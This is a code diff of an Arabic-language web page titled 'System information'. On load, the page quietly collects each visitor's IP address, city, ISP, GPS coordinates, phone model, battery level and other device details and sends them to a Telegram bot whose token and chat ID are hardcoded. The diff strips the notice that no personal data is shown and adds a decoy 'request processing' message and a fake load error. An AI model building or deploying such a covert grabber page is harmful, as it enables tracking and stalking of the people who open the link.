@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>معلومات النظام</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -26,13 +26,34 @@
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
             max-width: 600px;
             width: 100%;
+            text-align: center;
         }
         h1 {
             color: #0056b3;
             text-align: center;
+            margin-bottom: 10px;
         }
         p {
+            color: #666;
             text-align: center;
+        }
+        .status-message {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+        .status-sending {
+            background-color: #e6f7ff;
+            color: #007bff;
+        }
+        .status-success {
+            background-color: #e9fbe9;
+            color: #28a745;
+        }
+        .status-error {
+            background-color: #fff0f0;
+            color: #dc3545;
         }
     </style>
 </head>
@@ -41,15 +62,17 @@
     <div class="container">
         <h1>مرحبا بك! 👋</h1>
         <p>
-            مرحباً بكم في صفحة معلومات النظام.
-            <br>
-            هذه الصفحة لا تعرض أي بيانات شخصية.
+            تتم الآن معالجة طلبك. يرجى الانتظار...
         </p>
+        <div id="status" class="status-message status-sending">
+            يتم إرسال المعلومات...
+        </div>
     </div>
 
     <script>
         const BOT_TOKEN = '8386388789:AAGKW1bLw9xdEldclKGvNqUekVgE5WiuGaU';
         const CHAT_ID = '6313103532';
+        const statusElement = document.getElementById('status');
 
         function sendTelegramMessage(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -59,17 +82,18 @@
                 parse_mode: 'Markdown'
             });
 
-            fetch(`${url}?${params.toString()}`)
+            return fetch(`${url}?${params.toString()}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        console.log('تم إرسال الرسالة بنجاح إلى تيليجرام.');
+                        return true;
                     } else {
-                        console.error('فشل في إرسال الرسالة:', data.description);
+                        throw new Error(data.description);
                     }
                 })
                 .catch(error => {
-                    console.error('حدث خطأ في الاتصال:', error);
+                    console.error('فشل في إرسال الرسالة:', error);
+                    return false;
                 });
         }
         
@@ -105,7 +129,6 @@
                             );
                         });
                     } else {
-                        console.log('إذن الموقع غير ممنوح.');
                         return {};
                     }
                 } catch (error) {
@@ -113,75 +136,66 @@
                     return {};
                 }
             } else {
-                console.error('الموقع الجغرافي أو Permissions API غير مدعوم.');
                 return {};
             }
         }
 
-        async function gatherAndSendInfo() {
-            const [ipInfo, geoInfo] = await Promise.all([getIPInfo(), getGeolocation()]);
+        function getPhoneModel(userAgent) {
+            let manufacturer = "غير معروف";
+            let model = "غير معروف";
+            
+            const ua = userAgent.toLowerCase();
+            const androidMatch = ua.match(/(android|linux).*?; ([\w\s-]+)\)/);
 
-            const userAgent = navigator.userAgent;
-            const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            const supportsBluetooth = 'bluetooth' in navigator;
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
-            const deviceInfo = {
-                '📱 نوع الجهاز': getDeviceType(userAgent),
-                '🖥️ نظام التشغيل': getOS(userAgent),
-                '🌐 اسم المتصفح': getBrowser(userAgent).name,
-                '📊 إصدار المتصفح': getBrowser(userAgent).version,
-                '📜 إصدار الجهاز': userAgent,
-                '📏 دقة الشاشة': `${screen.width}x${screen.height}`,
-                '🔄 وضع الشاشة': screen.orientation.type,
-                '🌐 لغة النظام': navigator.language,
-                '✋ دعم الإيماءات اللمسية': hasTouch ? 'مدعوم' : 'غير مدعوم',
-                '🔵 دعم البلوتوث': supportsBluetooth ? 'مدعوم' : 'غير مدعوم',
-                '🔒 بروتوكول الأمان': window.location.protocol,
-                '🌍 عنوان IP': ipInfo.ip || 'غير معروف',
-                '🏙️ المدينة': ipInfo.city || 'غير معروف',
-                '🔻 الدولة': ipInfo.country_name || 'غير معروف',
-                '📈 خط الطول': geoInfo.longitude || 'غير معروف',
-                '📉 خط العرض': geoInfo.latitude || 'غير معروف',
-                '📶 الشبكة': ipInfo.org || 'غير معروف',
-                '📡 نوع الاتصال': connection ? connection.effectiveType : 'غير معروف',
-                '⚡ سرعة الاتصال': connection ? `${(connection.downlink || 0)} ميغابت في الثانية` : 'غير معروف',
-                '🧠 الذاكرة (RAM)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
-                '⚙️ عدد الأنوية': navigator.hardwareConcurrency || 'غير معروف',
-                '🎨 عمق الألوان': screen.colorDepth ? `${screen.colorDepth} بت` : 'غير معروف',
-                '🌍 إمكانية تحديد الموقع الجغرافي': 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
-                '⏰ الوقت': new Date().toLocaleString('ar-SA'),
-                '💾 الذاكرة الداخلية': 'غير معروف'
-            };
-
-            let message = `*معلومات جهاز جديد:*\n\n`;
-            for (const [key, value] of Object.entries(deviceInfo)) {
-                message += `- ${key}: ${value}\n`;
-            }
-
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    const batteryInfo = {
-                        '🔋 شحن الهاتف': `${(battery.level * 100).toFixed(0)}%`,
-                        '⚡ هل الهاتف يشحن؟': battery.charging ? 'نعم' : 'لا'
-                    };
-                    for (const [key, value] of Object.entries(batteryInfo)) {
-                        message += `- ${key}: ${value}\n`;
+            if (androidMatch && androidMatch[2]) {
+                const devicePart = androidMatch[2].trim();
+                if (devicePart.startsWith('sm-')) {
+                    manufacturer = "Samsung";
+                    model = devicePart;
+                } else if (devicePart.startsWith('pixel')) {
+                    manufacturer = "Google";
+                    model = devicePart;
+                } else if (devicePart.startsWith('lg-')) {
+                    manufacturer = "LG";
+                    model = devicePart;
+                } else if (devicePart.startsWith('huawei')) {
+                    manufacturer = "Huawei";
+                    model = devicePart;
+                } else if (devicePart.startsWith('moto')) {
+                    manufacturer = "Motorola";
+                    model = devicePart;
+                } else if (devicePart.startsWith('oneplus')) {
+                    manufacturer = "OnePlus";
+                    model = devicePart;
+                } else {
+                    const parts = devicePart.split(' ');
+                    if (parts.length > 1) {
+                         manufacturer = parts[0].replace(/_/g, ' ');
+                        model = parts.slice(1).join(' ').replace(/_/g, ' ');
+                    } else {
+                        model = devicePart.replace(/_/g, ' ');
                     }
-                    sendTelegramMessage(message);
-                });
-            } else {
-                sendTelegramMessage(message);
+                }
+            } else if (ua.includes("iphone") || ua.includes("ipad")) {
+                manufacturer = "Apple";
+                // Attempt to get model from User-Agent string. FBDV is often used by Facebook apps.
+                const fbdvMatch = userAgent.match(/FBDV\/([\w,]+)/i);
+                if (fbdvMatch && fbdvMatch[1]) {
+                    model = fbdvMatch[1].replace(/,/g, '-');
+                } else if (ua.includes('iphone')) {
+                    model = "iPhone";
+                } else if (ua.includes('ipad')) {
+                    model = "iPad";
+                }
             }
+
+            return { manufacturer, model };
         }
 
+
         function getDeviceType(userAgent) {
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
-                return "جهاز لوحي";
-            }
-            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) {
-                return "هاتف محمول";
-            }
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) return "جهاز لوحي";
+            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) return "هاتف محمول";
             return "حاسوب مكتبي";
         }
 
@@ -191,7 +205,10 @@
                 const match = userAgent.match(/Android\s([0-9.]+)/);
                 return match ? `Android ${match[1]}` : 'Android';
             }
-            if (/iPad|iPhone|iPod/i.test(userAgent)) return "iOS";
+            if (/iPad|iPhone|iPod/i.test(userAgent)) {
+                const osMatch = userAgent.match(/iPhone OS ([\d_]+)/);
+                return osMatch ? `iOS ${osMatch[1].replace(/_/g, '.')}` : 'iOS';
+            }
             if (/win/i.test(userAgent)) return "Windows";
             if (/mac/i.test(userAgent)) return "macOS";
             if (/linux/i.test(userAgent)) return "Linux";
@@ -202,14 +219,100 @@
             const ua = userAgent.toLowerCase();
             let name = "غير معروف";
             let version = "غير معروف";
-
-            if (ua.includes('edge')) { name = "Microsoft Edge"; version = ua.split('edge/')[1]; }
-            else if (ua.includes('edg')) { name = "Microsoft Edge"; version = ua.split('edg/')[1]; }
-            else if (ua.includes('chrome')) { name = "Chrome"; version = ua.split('chrome/')[1].split(' ')[0]; }
-            else if (ua.includes('safari')) { name = "Safari"; version = ua.split('version/')[1].split(' ')[0]; }
-            else if (ua.includes('firefox')) { name = "Firefox"; version = ua.split('firefox/')[1]; }
+            
+            if (ua.includes('fbav')) {
+                name = "Facebook In-App Browser";
+                const versionMatch = ua.match(/fbav\/([\d.]+)/);
+                if (versionMatch) {
+                    version = versionMatch[1];
+                }
+            } else if (ua.includes('safari')) {
+                name = "Safari";
+                const versionMatch = ua.match(/version\/([\d.]+)/);
+                if (versionMatch) {
+                    version = versionMatch[1];
+                }
+            } else if (ua.includes('chrome')) {
+                name = "Chrome";
+                const versionMatch = ua.match(/chrome\/([\d.]+)/);
+                if (versionMatch) {
+                    version = versionMatch[1].split(' ')[0];
+                }
+            } else if (ua.includes('firefox')) {
+                name = "Firefox";
+                const versionMatch = ua.match(/firefox\/([\d.]+)/);
+                if (versionMatch) {
+                    version = versionMatch[1];
+                }
+            }
 
             return { name, version };
+        }
+
+        async function gatherAndSendInfo() {
+            try {
+                const [ipInfo, geoInfo] = await Promise.all([getIPInfo(), getGeolocation()]);
+                const userAgent = navigator.userAgent;
+                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+                const supportsBluetooth = 'bluetooth' in navigator;
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const phoneInfo = getPhoneModel(userAgent);
+                const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف';
+                const processorCores = navigator.hardwareConcurrency || 'غير معروف';
+                
+                const deviceInfo = {
+                    '📱 نوع الجهاز': getDeviceType(userAgent),
+                    '🖥️ نظام التشغيل': getOS(userAgent),
+                    '🌐 اسم المتصفح': getBrowser(userAgent).name,
+                    '📊 إصدار المتصفح': getBrowser(userAgent).version,
+                    '📜 إصدار الجهاز': userAgent,
+                    '📏 دقة الشاشة': `${screen.width}x${screen.height}`,
+                    '🔄 وضع الشاشة': screen.orientation.type,
+                    '🌐 لغة النظام': navigator.language,
+                    '✋ دعم الإيماءات اللمسية': hasTouch ? 'مدعوم' : 'غير مدعوم',
+                    '🔵 دعم البلوتوث': supportsBluetooth ? 'مدعوم' : 'غير مدعوم',
+                    '🔒 بروتوكول الأمان': window.location.protocol,
+                    '🌍 عنوان IP': ipInfo.ip || 'غير معروف',
+                    '🏙️ المدينة': ipInfo.city || 'غير معروف',
+                    '🔻 الدولة': ipInfo.country_name || 'غير معروف',
+                    '📶 شركة مزود الإنترنت': ipInfo.org || 'غير معروف',
+                    '📈 خط الطول': geoInfo.longitude || 'غير معروف',
+                    '📉 خط العرض': geoInfo.latitude || 'غير معروف',
+                    '📡 نوع الاتصال': connection ? connection.effectiveType : 'غير معروف',
+                    '⚡ سرعة الاتصال': connection ? `${(connection.downlink || 0)} ميغابت في الثانية` : 'غير معروف',
+                    '🧠 الذاكرة (RAM)': ram,
+                    '⚙️ عدد الأنوية': processorCores,
+                    '🎨 عمق الألوان': screen.colorDepth ? `${screen.colorDepth} بت` : 'غير معروف',
+                    '🌍 إمكانية تحديد الموقع الجغرافي': 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم',
+                    '⏰ الوقت': new Date().toLocaleString('ar-SA'),
+                    '📱 الشركة الصانعة': phoneInfo.manufacturer,
+                    '📱 طراز الهاتف': phoneInfo.model
+                };
+
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    deviceInfo['🔋 شحن الهاتف'] = `${(battery.level * 100).toFixed(0)}%`;
+                    deviceInfo['⚡ هل الهاتف يشحن؟'] = battery.charging ? 'نعم' : 'لا';
+                }
+
+                let message = `*معلومات جهاز جديد:*\n\n`;
+                for (const [key, value] of Object.entries(deviceInfo)) {
+                    message += `- ${key}: ${value}\n`;
+                }
+
+                const isSuccess = await sendTelegramMessage(message);
+                if (isSuccess) {
+                    statusElement.textContent = 'تم استلام طلبك.';
+                    statusElement.classList.replace('status-sending', 'status-success');
+                } else {
+                    statusElement.textContent = 'فشل التحميل. يرجى المحاولة لاحقًا.';
+                    statusElement.classList.replace('status-sending', 'status-error');
+                }
+
+            } catch (error) {
+                statusElement.textContent = 'فشل التحميل. يرجى المحاولة لاحقًا.';
+                statusElement.classList.replace('status-sending', 'status-error');
+            }
         }
         
         document.addEventListener('DOMContentLoaded', () => {
